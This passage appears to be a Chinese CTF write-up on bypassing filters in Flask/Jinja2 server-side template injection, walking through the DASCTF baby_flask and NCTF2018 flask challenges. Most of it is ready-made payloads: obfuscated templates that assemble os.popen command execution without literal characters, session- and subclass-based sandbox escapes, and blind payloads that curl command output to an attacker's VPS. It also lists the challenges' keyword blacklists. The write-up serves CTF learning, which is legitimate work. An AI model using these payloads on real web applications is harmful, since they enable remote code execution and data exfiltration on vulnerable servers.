    {% set zero = (({ }|select|string|list).pop(38)|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs|int %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set seven = (zero-one-one-five)|abs %}{% set xhx = (({ }|select|string|list).pop(24)|string) %}{% set space = (({ }|select|string|list).pop(10)|string) %}{% set point = ((app.__doc__|string|list).pop(26)|string) %}{% set yin = ((app.__doc__|string|list).pop(195)|string) %}{% set left = ((app.__doc__|string|list).pop(189)|string) %}{% set right = ((app.__doc__|string|list).pop(200)|string) %}{% set c = dict(c=aa)|reverse|first %}{% set bfh=self|string|urlencode|first %}{% set bfhc=bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set os = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx*2~but~xhx*2 %}{% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}{% for f,v in whoami.__init__.__globals__.items() %}{% if f == bul %}{% for a,b in v.items() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}
如上图所示，成功执行命令并得到了flag。
### [2021 MAR & DASCTF]baby_flask
当时这道题没做出来，这里我们在本地使用vulnhub中的flask搭建环境进行复现：
在 `/getname?name=` 处存在SSTI。
F12查看源代码发现提示过滤了一下字符：
    blacklist   
    '.','[','\'','"','\\','+',':','_',   
    'chr','pop','class','base','mro','init','globals','get',   
    'eval','exec','os','popen','open','read',   
    'select','url_for','get_flashed_messages','config','request',   
    'count','length','０','１','２','３','４','５','６','７','８','９','0','1','2','3','4','5','6','7','8','9'
过滤的死死地，甚至将所有的数字都过滤了。我们仍然可以使用通过滤器进行绕过，经过之前那道题的演示，我们可以很容易的构造出被过滤了的字符或字符串。
Payload构造过程如下：
    # 首先构造出所需的数字: 
    {% set zero = (self|int) %}    # 0, 也可以使用lenght过滤器获取数字
    {% set one = (zero**zero)|int %}    # 1
    {% set two = (zero-one-one)|abs %}    # 2
    {% set four = (two*two)|int %}    # 4
    {% set five = (two*two*two)-one-one-one %}    # 5
    {% set three = five-one-one %}    # 3
    {% set nine = (two*two*two*two-five-one-one) %}    # 9
    {% set seven = (zero-one-one-five)|abs %}    # 7
    # 构造出所需的各种字符与字符串: 
    {% set space = self|string|min %}    # 空格
    {% set point = self|float|string|min %}    # .
    {% set c = dict(c=aa)|reverse|first %}    # 字符 c
    {% set bfh = self|string|urlencode|first %}    # 百分号 %
    {% set bfhc = bfh~c %}    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接
    {% set slas = bfhc%((four~seven)|int) %}    # 使用%c构造斜杠 /
    {% set yin = bfhc%((three~nine)|int) %}    # 使用%c构造引号 '
    {% set xhx = bfhc%((nine~five)|int) %}    # 使用%c构造下划线 _
    {% set right = bfhc%((four~one)|int) %}    # 使用%c构造右括号 )
    {% set left = bfhc%((four~zero)|int) %}    # 使用%c构造左括号 (
    {% set but = dict(buil=aa,tins=dd)|join %}    # builtins
    {% set imp = dict(imp=aa,ort=dd)|join %}    # import
    {% set pon = dict(po=aa,pen=dd)|join %}    # popen
    {% set so = dict(o=aa,s=dd)|join %}    # os
    {% set ca = dict(ca=aa,t=dd)|join %}    # cat
    {% set flg = dict(fl=aa,ag=dd)|join %}    # flag
    {% set ev = dict(ev=aa,al=dd)|join %}    # eval
    {% set red = dict(re=aa,ad=dd)|join %}    # read
    {% set bul = xhx~xhx~but~xhx~xhx %}    # __builtins__
    {% set ini = dict(ini=aa,t=bb)|join %}    # init
    {% set glo = dict(glo=aa,bals=bb)|join %}    # globals
    {% set itm = dict(ite=aa,ms=bb)|join %}    # items
    # 将上面构造的字符或字符串拼接起来构造出 __import__('os').popen('cat /flag').read(): 
    {% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}
    # 然后将上面构造的各种变量添加到SSTI万能payload里面就行了: 
    {% for f,v in (whoami|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}    # globals
        {% if f == bul %} 
            {% for a,b in (v|attr(itm))() %}    # builtins
                {% if a == ev %}    # eval
                    {{b(pld)}}    # eval("__import__('os').popen('cat /flag').read()")
                {% endif %}
            {% endfor %}
        {% endif %}
    {% endfor %}
    # 最后的payload如下:
    {% set zero = (self|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set three = five-one-one %}{% set nine = (two*two*two*two-five-one-one) %}{% set seven = (zero-one-one-five)|abs %}{% set space = self|string|min %}{% set point = self|float|string|min %}{% set c = dict(c=aa)|reverse|first %}{% set bfh = self|string|urlencode|first %}{% set bfhc = bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set yin = bfhc%((three~nine)|int) %}{% set xhx = bfhc%((nine~five)|int) %}{% set right = bfhc%((four~one)|int) %}{% set left = bfhc%((four~zero)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set so = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx~xhx~but~xhx~xhx %}{% set ini = dict(ini=aa,t=bb)|join %}{% set glo = dict(glo=aa,bals=bb)|join %}{% set itm = dict(ite=aa,ms=bb)|join %}{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}{% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}{% if f == bul %}{% for a,b in (v|attr(itm))() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}
## 过滤了request和class
这里除了用上面中括号或 `|attr()` 那几种方法外，我们还可以利用flask里面的session对象和config对象来逃逸这一姿势。
下面通过NCTF2018的两道flask题目来仔细讲解。
### [NCTF2018]flask真香
打开题目一看，是一个炫酷的demo演示，这种demo一般是没有啥东西好挖的。首先F12信息收集，发现Python版本是3.5.2，没有Web静态服务器。
随便点开第二个demo发现404了，这里注意到404界面是Flask提供的404界面，按照以往的经验，猜测这里存在SSTI注入。
先尝试简单的payload：
从这里可见，毫无疑问的存在SSTI漏洞了。
那么就来康康到底有没有WAF，有的话被过滤了哪些。经过一番测试，确实很多东西都被过滤了，而且是正则表达式直接匹配删去，无法嵌套绕过。不完整测试有以下：
    config
    class
    mro
    args
    request
    open
    eval
    builtins
    import
从这里来看，似乎已经完全无法下手了。因为request和class都被过滤掉了。
卡在这里以后，最好的办法就是去查Flask官方文档了。从Flask官方文档里，找到了session对象，经过测试没有被过滤。更巧的是，session一定是一个dict对象，因此我们可以通过键的方法访问相应的类。
**由于键是一个字符串，因此可以通过字符串拼接绕过。**
python：
    {{session['__cla'+'ss__']}}
访问到了类，我们就可以通过 `__bases__`
来获取基类的元组，带上索引0就可以访问到相应的基类。由此一直向上我们就可以访问到最顶层的`object`基类了。
**（同样的，如果没有过滤config的话，我们还可以利用config来逃逸，方法与session的相同）**
payload：
    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]}}
有了对象基类，我们就可以通过访问 `__subclasses__` 方法再实例化去访问所有的子类。同样使用字符串拼接绕过WAF，这样就实现沙箱逃逸了。
payload：
    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'ss__']()}}
SSTI目的无非就是两个：文件读写、执行命令。因此我们核心应该放在file类和os类。而坑爹的是，Python3几乎换了个遍。因此这里得去看官方文档去找相应的基类的用处。
我还是从os库入手，直接搜索“os”，找到了 `os._wrap_close`
类，同样使用dict键访问的方法。猜大致范围得到了索引序号，我这里序号是312，
payload：
    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[312]}}
我们调用它的 `__init__` 函数将其实例化，然后用 `__globals__` 查看其全局变量。
payload：
    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[312].__init__.__globals__}}
眼又花了，但我们的目的很明显，就是要执行命令，于是直接搜索 “popen” 就可以了：
由于又是一个dict类型，我们调用的时候又可以使用字符串拼接，绕过open过滤。
后面顺理成章的，我们将命令字符串传入，实例化这个函数，然后直接调用read方法就可以了。
payload：
    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[312].__init__.__globals__['po'+'pen']('ls /').read()}}
    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[312].__init__.__globals__['po'+'pen']('cat /Th1s__is_S3cret').read()}}
### [NCTF2018]Flask PLUS
看到又是Flask，后面又加了PLUS，想必内容肯定没变，应该是过滤内容增加了。
打开题目康康，果然还是demo，随便造一个404，还是那个界面。
直接拿上一道题的payload去找所有的类，果然还是那么多。找到 `os._wrap_close` 类，打一发上次的payload，结果炸了：
也就是说，这里更新了过滤的内容，需要bypass。
我们来探测了一下，发现这次又加了一些过滤：
    __init__
    file
    __dict__
    __builtins__
    __import__
    getattr
    os
完蛋了了，很多方法被过滤了之后，几乎无法访问到我们所需要的方法。
到这里，我们本地机测试一下，看看有哪些方法我们可以用的：
这里我们注意到了`__enter__`方法，查看其内容，发现其竟然有 `__globals__` 方法可用，也就是说这个`__enter__`方法与
`__init__` 方法一模一样。
这里摘抄下一段stack overflow的一段话
这里摘抄下一段stack overflow的一段话
>   * `__init__` (allocation of the class)
>   * `__enter__` (enter context)
>   * `__exit__` (leaving context)
>
因此 `__enter__` 仅仅访问类的内容，但这已经可以达到我们所需要的目的了。
构造payload：
    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[256].__enter__.__globals__['po'+'pen']('ls /').read()}}
    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[256].__enter__.__globals__['po'+'pen']('cat /Th1s_is__F1114g').read()}}
## 没有回显的 SSTI
当目标存在 SSTI 漏洞但是没有payload执行的回显时，我们可以使用 `os.popen` 和 `curl` 将执行结果外带出来。
例如下面这道题。进入题目后，会让你输入一个姓名然后将其输出：
经测试目标存在SSTI漏洞，但是过滤了 `{{` 和 `}}`，我们可以使用 `{%print(......)%}` 的形式来绕过。
    {%print(''.__class__)%}
但是执行后却没有任何回显了，所以我们还得换一条路子。这里我们使用 `{% if ... %}1{% endif %}` 配合 `os.popen` 和
`curl` 外带数据的方法。
首先在自己vps上面开启监听：
然后执行如下payload在根目录里面寻找flag：
    {% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://47.xxx.xxx.72:2333 -d `ls /|grep flag`') %}1{% endif %}
如下图所示，发现flag文件：
执行如下payload读取flag：
    {% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://47.xxx.xxx.72:2333 -d `cat /flag_1s_Hera`') %}1{% endif %}
读取成功：
## 未完待续……
> 参考：
>
> [https://evi0s.com/2018/11/26/深入SSTI-> 从NCTF2018两道Flask看bypass新姿势](https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/)
>
> [https://misakikata.github.io/2020/04/python-> 沙箱逃逸与SSTI](https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#SSTI)
>
> 